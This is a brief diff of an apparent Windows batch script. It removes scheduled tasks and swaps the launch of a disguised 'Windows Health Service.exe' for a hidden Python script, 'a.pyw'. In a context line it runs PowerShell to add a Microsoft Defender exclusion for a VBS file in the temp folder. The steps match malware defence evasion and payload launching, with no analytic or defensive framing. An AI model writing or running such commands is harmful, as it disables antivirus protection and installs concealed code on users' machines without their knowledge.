@@ -1,7 +1,7 @@
 schtasks /delete /tn "upgradef1" /f
 schtasks /delete /tn "InstallRequests" /f
 schtasks /delete /tn "RunPowerShellScript" /f
-start "Windows Health Service.exe"
+py a.pyw
 
 cd %temp%
 powershell -Command "Add-MpPreference -ExclusionPath '%temp%\d.vbs'"
